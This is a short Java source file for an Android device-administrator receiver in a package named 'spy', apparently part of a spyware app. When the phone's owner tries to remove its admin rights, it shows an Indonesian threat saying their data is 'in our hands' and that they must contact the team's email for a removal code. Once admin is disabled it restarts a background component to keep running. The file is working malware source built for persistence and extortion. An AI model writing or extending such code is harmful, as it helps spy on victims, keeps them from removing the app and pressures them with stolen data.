package ai.m4zk1play.spy;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public CharSequence onDisableRequested(Context ctx, Intent intent) {
        Keys k = Keys.read(ctx);
        return "Warning !!!\n\n"
                + "Jangan mencoba menghapus APK karena data-data anda di tangan kami.\n\n"
                + "Hubungi " + k.team + "\n" + k.email + "\n\n"
                + "Masukkan kode penghapusan: " + k.pin + "\n"
                + "Untuk meminta kode penghapusan hubungi email di atas.";
    }

    @Override
    public void onDisabled(Context ctx, Intent intent) {
        super.onDisabled(ctx, intent);
        BootProvider.start(ctx);
    }
}
